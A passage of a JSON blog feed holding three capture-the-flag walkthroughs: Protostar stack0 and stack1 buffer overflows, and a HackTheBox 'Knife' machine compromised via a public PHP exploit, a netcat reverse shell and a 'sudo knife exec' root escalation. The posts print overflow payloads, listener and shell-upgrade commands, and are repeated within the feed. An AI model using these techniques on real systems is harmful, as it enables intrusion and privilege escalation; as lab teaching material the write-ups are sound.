alt=\"\">\n","content":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/0*jy8ZWxIqtfRBEJw3.jpg\"><figcaption>source:<a href=\"https://hacksland.net/\">hacksland.net</a></figcaption></figure><p>Hello hackers! hope you are all doing well today. Now that we have done stack-0 and have a basic idea of how a stack frame is built, we can move on to\u00a0stack-1.</p>\n<p><strong>SOURCE CODE:</strong></p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/679/1*xc9U1hVSHty4sAqPVYqdOg.png\"><figcaption>source: <a href=\"https://exploit.education/protostar/stack-one/\">https://exploit.education/protostar/stack-one/</a></figcaption></figure><p><strong>/opt/protostar/bin/stack1:</strong></p>\n<p>Let us analyze the given code, seems like a modified variable is created first and then pushed down the stack and a buffer of space 64 is created. Pretty much like stack 0. You can refer the stack 0 from my previous write-up by clicking <a href=\"https://tejas303525.medium.com/protostar-walkthrough-stack0-484abfebf1c1\">here</a>\u00a0:). But here we see there is NO gets function, so where exactly can we inject our payload?!.</p>\n<p>When we run the code we get asked for an argument. We can see it in the code\u00a0itself.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/669/1*kI7-SMSgjiUXyS9pon5XZQ.png\"></figure><p>So that\u2019s gonna be our way in to inject our payload. In order to pass an argument, we can either use a tilde operator (\u201c ` \")or a (\u201c $ \u201d)\u00a0symbol</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/669/1*-tJt_9Sq21XLPNGwa7lXIQ.png\"></figure><p>Now our error message is different from the first time,so clearly we can pass our payload as an argument\u00a0. Now what to do next. Let us have a look at our code. It has a condition that says \u2018<strong>modified= 0x61626364</strong>\u2019. So that's how we get to the modified space. Now our payload is going to\u00a0be:</p>\n<blockquote>./stack1 $(python -c \u2018print \u201cA\u201d*64 + \u201c\\x64\\x63\\x62\\x61\u201d\u2019)</blockquote>\n<p>Our payload says the program to fill the buffer space 64 times with random characters (A according to my payload) and then specify the address of the modified variable.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/721/1*C36p1d6tII60FmVlct0pfw.png\"></figure><p>You might wonder why we used 64 bytes instead of 65 bytes like the last time. Well here is the reason. In the last question, we just needed to overwrite the buffer space and stand on top of the modified space and that will print us the required output. But in this payload, we print exactly 64 times so that we overwrite buffer space and stand on the starting line of modified space and then we can give the correct address to the modified space to get our required output\u00a0:D.</p>\n<p>That is going to be a walkthrough of stack 1. Hope you have understood the concept clearly. More of the stack walkthroughs are yet to be released, until then take care, bye bye\u00a0:).</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=8bf58a441cf7\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["protostar-walkthrough","hacking","stack1"]},{"title":"PROTOSTAR WALKTHROUGH-Stack0","pubDate":"2021-08-16 20:11:45","link":"https://tejas303525.medium.com/protostar-walkthrough-stack0-484abfebf1c1?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/484abfebf1c1","author":"Prof.bubs","thumbnail":"","description":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*3zqD_jSPKeWfv-4BaPZqQg.jpeg\"><figcaption>source:hacksland.net</figcaption></figure><p><strong>INSTALLATION</strong>:</p>\n<p>Protostar is a VM built specifically to train and test our knowledge of binary exploitation. It is highly recommended to try these challenges as it will help us have a better understanding of how the stack works and how to abuse it properly to spawn a shell or buffer overflow\u00a0it.</p>\n<p>We can install protostarVM into our system from the following website:</p>\n<blockquote><a href=\"https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/\"><strong>https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/.</strong></a></blockquote>\n<p>Now that we have installed our protostar we can log in using the default creds as <strong>user: user</strong> for user and root:godmode for the root user. My suggestion is to log in as a root user and get ur IP using the command\u00a0:</p>\n<blockquote>ifconfig</blockquote>\n<p>and after that ssh a user into ur terminal. Also, spawn the bash shell into ur terminal using the bash command once logged to make our job\u00a0easier.</p>\n<p>Now we are all set up and ready to go. All the questions for the challenges are given at the following website:</p>\n<blockquote><a href=\"https://exploit.education/protostar/\"><strong>https://exploit.education/protostar/</strong></a></blockquote>\n<h3>/opt/protostar/bin/stack0</h3>\n<p>Alright, let's begin with our first challenge, stack\u00a00.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/812/1*2QTOcVcO7ADDk__vyM5YRg.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-zero/\">https://exploit.education/protostar/stack-zero/</a></figcaption></figure><p>Let us first try and understand this code and draw a simple stack diagram for a better understanding of what to do\u00a0:).</p>\n<p>So it seems 2 variables namely \u201c<strong>modified</strong>\u201d and \u201c<strong>buffer</strong>\u201d are created in the stack. And there is a <strong>gets </strong>function that is used in this program. <strong>gets </strong>is a dangerous function used by programmers which can be easily abused to stack buffer overflow. Primarily because this function doesn't check the number of inputs given in the stack and it keeps receiving it until the stack eventually crashes leading to stack overflow. To understand more about it we can see the gets man page on the Linux terminal.</p>\n<p>Back to hacking:). So first the <strong>modified</strong> integer variable gets created and then the buffer of space 64 is created so now the <strong>modified</strong> variable is pushed down the stack. When we put all this on a stack diagram, it would look like\u00a0this.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/839/1*ehojr8vPVJ7tFN0lisMw3Q.png\"><figcaption>stack diagram</figcaption></figure><p>Let us ignore esp, ebp and ret/eip for some other day. We will also ignore my handwriting.</p>\n<p>Most of our programs start from the buffer space. All we have to do is overflow the buffer and we will reach the modified space which is exactly what we want according to the\u00a0program.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/884/1*3c1FWRZgFkWmatQhR3a4iQ.png\"><figcaption>stack diagram</figcaption></figure><p>Once we reach the modified space we will be displayed with \u201c<strong>you have changed the modified variable</strong>\u201d.</p>\n<p>so our payload is going to\u00a0be:</p>\n<blockquote>(python -c \u2018print\u201dA\u201d*65\u2019)|./stack0</blockquote>\n<p>Our payload says we are gonna print \u201cA\u201d 65 times basically overflowing the buffer space reaching the modified\u00a0space.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/664/1*CUpTN8vfEMidtzyShXEroA.png\"></figure><p>That\u2019s gonna be my first of all the other seven protostar challenges. Soon I will be updating rest until then take care, bye-bye\u00a0:D.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=484abfebf1c1\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*3zqD_jSPKeWfv-4BaPZqQg.jpeg\"><figcaption>source:hacksland.net</figcaption></figure><p><strong>INSTALLATION</strong>:</p>\n<p>Protostar is a VM built specifically to train and test our knowledge of binary exploitation. It is highly recommended to try these challenges as it will help us have a better understanding of how the stack works and how to abuse it properly to spawn a shell or buffer overflow\u00a0it.</p>\n<p>We can install protostarVM into our system from the following website:</p>\n<blockquote><a href=\"https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/\"><strong>https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/.</strong></a></blockquote>\n<p>Now that we have installed our protostar we can log in using the default creds as <strong>user: user</strong> for user and root:godmode for the root user. My suggestion is to log in as a root user and get ur IP using the command\u00a0:</p>\n<blockquote>ifconfig</blockquote>\n<p>and after that ssh a user into ur terminal. Also, spawn the bash shell into ur terminal using the bash command once logged to make our job\u00a0easier.</p>\n<p>Now we are all set up and ready to go. All the questions for the challenges are given at the following website:</p>\n<blockquote><a href=\"https://exploit.education/protostar/\"><strong>https://exploit.education/protostar/</strong></a></blockquote>\n<h3>/opt/protostar/bin/stack0</h3>\n<p>Alright, let's begin with our first challenge, stack\u00a00.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/812/1*2QTOcVcO7ADDk__vyM5YRg.png\"><figcaption><a href=\"https://exploit.education/protostar/stack-zero/\">https://exploit.education/protostar/stack-zero/</a></figcaption></figure><p>Let us first try and understand this code and draw a simple stack diagram for a better understanding of what to do\u00a0:).</p>\n<p>So it seems 2 variables namely \u201c<strong>modified</strong>\u201d and \u201c<strong>buffer</strong>\u201d are created in the stack. And there is a <strong>gets </strong>function that is used in this program. <strong>gets </strong>is a dangerous function used by programmers which can be easily abused to stack buffer overflow. Primarily because this function doesn't check the number of inputs given in the stack and it keeps receiving it until the stack eventually crashes leading to stack overflow. To understand more about it we can see the gets man page on the Linux terminal.</p>\n<p>Back to hacking:). So first the <strong>modified</strong> integer variable gets created and then the buffer of space 64 is created so now the <strong>modified</strong> variable is pushed down the stack. When we put all this on a stack diagram, it would look like\u00a0this.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/839/1*ehojr8vPVJ7tFN0lisMw3Q.png\"><figcaption>stack diagram</figcaption></figure><p>Let us ignore esp, ebp and ret/eip for some other day. We will also ignore my handwriting.</p>\n<p>Most of our programs start from the buffer space. All we have to do is overflow the buffer and we will reach the modified space which is exactly what we want according to the\u00a0program.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/884/1*3c1FWRZgFkWmatQhR3a4iQ.png\"><figcaption>stack diagram</figcaption></figure><p>Once we reach the modified space we will be displayed with \u201c<strong>you have changed the modified variable</strong>\u201d.</p>\n<p>so our payload is going to\u00a0be:</p>\n<blockquote>(python -c \u2018print\u201dA\u201d*65\u2019)|./stack0</blockquote>\n<p>Our payload says we are gonna print \u201cA\u201d 65 times basically overflowing the buffer space reaching the modified\u00a0space.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/664/1*CUpTN8vfEMidtzyShXEroA.png\"></figure><p>That\u2019s gonna be my first of all the other seven protostar challenges. Soon I will be updating rest until then take care, bye-bye\u00a0:D.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=484abfebf1c1\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["stack0","protostar-walkthrough"]},{"title":"HackTheBox\u200a\u2014\u200aKnife","pubDate":"2021-07-21 18:55:09","link":"https://tejas303525.medium.com/hackthebox-knife-f650e6b7b4d0?source=rss-aabefe26c4b3------2","guid":"https://medium.com/p/f650e6b7b4d0","author":"Prof.bubs","thumbnail":"","description":"\n<h3>\n<a href=\"https://hariharan252001.medium.com/hackthebox-machine-cap-9d0dd8f3cbbc?source=user_profile---------0----------------------------\">HackTheBox\u200a\u2014\u200a</a>Knife</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*k92WFAfNEu-T3OLYto6Quw.jpeg\"><figcaption>Source: google\u00a0images</figcaption></figure><p>knife is a new HTB machine based on Linux OS and it carries 20 points. It is a fairly easy machine that I was willing to give a shot. There are a few pre-requisites needed before we start this challenge. Some of them are Linux VM,wappalyzer, which is a chrome extension or we can use Recon-ng but in this write-up I used wappalyzer. So let's get\u00a0started:</p>\n<p>Reconnaissance:</p>\n<p>I began with a simple Nmap\u00a0scan.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/865/1*We9BbjyQPKsGGNwKxMF3JQ.png\"></figure><p>There was nothing valuable I could infer from this scan except the fact that it had a web server running on port\u00a080.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*9pITDOaCkS7bPEtNAaBrGA.png\"><figcaption>Webserver</figcaption></figure><p>The site was pretty standard. I tried the usual inspection using inspect element and I literally came up with nothing up until I noticed\u00a0this.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*PLz9swFt6p0pI84aT5u_aQ.png\"><figcaption>webserver</figcaption></figure><p>The wappalyzer found out that the webserver was written using a PHP programming language of version 8.1.0. Now all I had to do was search was exploit on exploitDB for possible vulnerability in such a version of\u00a0PHP.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*nstqXXmeNm4Lv0IRGC3qBw.png\"><figcaption>source:<a href=\"https://www.exploit-db.com/exploits/49933\">https://www.exploit-db.com/exploits/49933</a></figcaption></figure><p>Bingo! I found a perfect exploit. Now all I had to do was download it or save it in a file and run the\u00a0script.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bFd5_gwEEv2FY4a3KPQf0w.png\"></figure><p>And just like that, we got into their system. Now many things won't work for us since we don't have certain permissions on their system. So I tried to open their system to my side. In simple words, I bought their system into mine. In order to do this, we need to pop open a reverse shell onto their system and connect to ours using a tool called netcat. Now to get a reverse shell I used a script from pentest monkey for\u00a0netcat</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/759/1*Ro0AI22xAzSUTGuoVhtDMA.png\"><figcaption>source:<a href=\"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></figcaption></figure><p>The second command seemed to work fine. So first I started listening to port 4444 using netcat\u00a0command</p>\n<p>|nc -nvlp\u00a04444</p>\n<p>and then I pasted the command from the pentest monkey into the\u00a0system.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/605/1*o-NvWL8MWalNkfjpgl7d_w.png\"></figure><p>And just like that, I got a reverse shell into their system. Now I will apply tty shells to make our lives easier, which is moving around the terminal and using specific commands like \u2018cd\u2019 and so on. These are the commands to get a tty\u00a0shell:</p>\n<p>|python3 -c \u2018import pty;pty.spawn(\u201c/bin/bash\u201d)\u2019<br>|export TERM=xterm</p>\n<p>Once that's done we would get a terminal looking like\u00a0this:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/753/1*E5TnsRLuQ2ePs120LnNX0w.png\"></figure><p>The first user flag was located at the directory /home/james.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/970/1*GNsW9UssBGTbv-XiHYgCDA.png\"></figure><p>Now with this command, we can understand that the command knife is a root operation but it does not need any password. This is clearly our vulnerability and we are about to abuse it to escalate our privileges. But first what is Knife?! so let's run that command and see what we\u00a0get:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*GQZopbcqDzjfOlw9pMUPuQ.png\"></figure><p>We are simply going to use this rooted operation to execute a /bin/sh into the system. The /bin/sh command was even there at the config files at the /homes/James directory, we are simply using that command to escalate our privalages. This the command to do\u00a0so:</p>\n<p>|sudo knife exec\u200a\u2014\u200aexec \u201cexec \u2018/bin/sh -i\u2019\u00a0\u201c</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/773/1*JZj55enXAfBQQJ_lEkDowA.png\"></figure><p>BINGO! The flag is located in the root folder. Thank you for reading my write-up!\u00a0:) please like if you felt like my write-up was useful to you in anyways, thank you once\u00a0again!.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=f650e6b7b4d0\" width=\"1\" height=\"1\" alt=\"\">\n","content":"\n<h3>\n<a href=\"https://hariharan252001.medium.com/hackthebox-machine-cap-9d0dd8f3cbbc?source=user_profile---------0----------------------------\">HackTheBox\u200a\u2014\u200a</a>Knife</h3>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*k92WFAfNEu-T3OLYto6Quw.jpeg\"><figcaption>Source: google\u00a0images</figcaption></figure><p>knife is a new HTB machine based on Linux OS and it carries 20 points. It is a fairly easy machine that I was willing to give a shot. There are a few pre-requisites needed before we start this challenge. Some of them are Linux VM,wappalyzer, which is a chrome extension or we can use Recon-ng but in this write-up I used wappalyzer. So let's get\u00a0started:</p>\n<p>Reconnaissance:</p>\n<p>I began with a simple Nmap\u00a0scan.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/865/1*We9BbjyQPKsGGNwKxMF3JQ.png\"></figure><p>There was nothing valuable I could infer from this scan except the fact that it had a web server running on port\u00a080.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*9pITDOaCkS7bPEtNAaBrGA.png\"><figcaption>Webserver</figcaption></figure><p>The site was pretty standard. I tried the usual inspection using inspect element and I literally came up with nothing up until I noticed\u00a0this.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*PLz9swFt6p0pI84aT5u_aQ.png\"><figcaption>webserver</figcaption></figure><p>The wappalyzer found out that the webserver was written using a PHP programming language of version 8.1.0. Now all I had to do was search was exploit on exploitDB for possible vulnerability in such a version of\u00a0PHP.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*nstqXXmeNm4Lv0IRGC3qBw.png\"><figcaption>source:<a href=\"https://www.exploit-db.com/exploits/49933\">https://www.exploit-db.com/exploits/49933</a></figcaption></figure><p>Bingo! I found a perfect exploit. Now all I had to do was download it or save it in a file and run the\u00a0script.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*bFd5_gwEEv2FY4a3KPQf0w.png\"></figure><p>And just like that, we got into their system. Now many things won't work for us since we don't have certain permissions on their system. So I tried to open their system to my side. In simple words, I bought their system into mine. In order to do this, we need to pop open a reverse shell onto their system and connect to ours using a tool called netcat. Now to get a reverse shell I used a script from pentest monkey for\u00a0netcat</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/759/1*Ro0AI22xAzSUTGuoVhtDMA.png\"><figcaption>source:<a href=\"https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></figcaption></figure><p>The second command seemed to work fine. So first I started listening to port 4444 using netcat\u00a0command</p>\n<p>|nc -nvlp\u00a04444</p>\n<p>and then I pasted the command from the pentest monkey into the\u00a0system.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/605/1*o-NvWL8MWalNkfjpgl7d_w.png\"></figure><p>And just like that, I got a reverse shell into their system. Now I will apply tty shells to make our lives easier, which is moving around the terminal and using specific commands like \u2018cd\u2019 and so on. These are the commands to get a tty\u00a0shell:</p>\n<p>|python3 -c \u2018import pty;pty.spawn(\u201c/bin/bash\u201d)\u2019<br>|export TERM=xterm</p>\n<p>Once that's done we would get a terminal looking like\u00a0this:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/753/1*E5TnsRLuQ2ePs120LnNX0w.png\"></figure><p>The first user flag was located at the directory /home/james.</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/970/1*GNsW9UssBGTbv-XiHYgCDA.png\"></figure><p>Now with this command, we can understand that the command knife is a root operation but it does not need any password. This is clearly our vulnerability and we are about to abuse it to escalate our privileges. But first what is Knife?! so let's run that command and see what we\u00a0get:</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*GQZopbcqDzjfOlw9pMUPuQ.png\"></figure><p>We are simply going to use this rooted operation to execute a /bin/sh into the system. The /bin/sh command was even there at the config files at the /homes/James directory, we are simply using that command to escalate our privalages. This the command to do\u00a0so:</p>\n<p>|sudo knife exec\u200a\u2014\u200aexec \u201cexec \u2018/bin/sh -i\u2019\u00a0\u201c</p>\n<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/773/1*JZj55enXAfBQQJ_lEkDowA.png\"></figure><p>BINGO! The flag is located in the root folder. Thank you for reading my write-up!\u00a0:) please like if you felt like my write-up was useful to you in anyways, thank you once\u00a0again!.</p>\n<img src=\"https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=f650e6b7b4d0\" width=\"1\" height=\"1\" alt=\"\">\n","enclosure":{},"categories":["htb-writeup"]}]}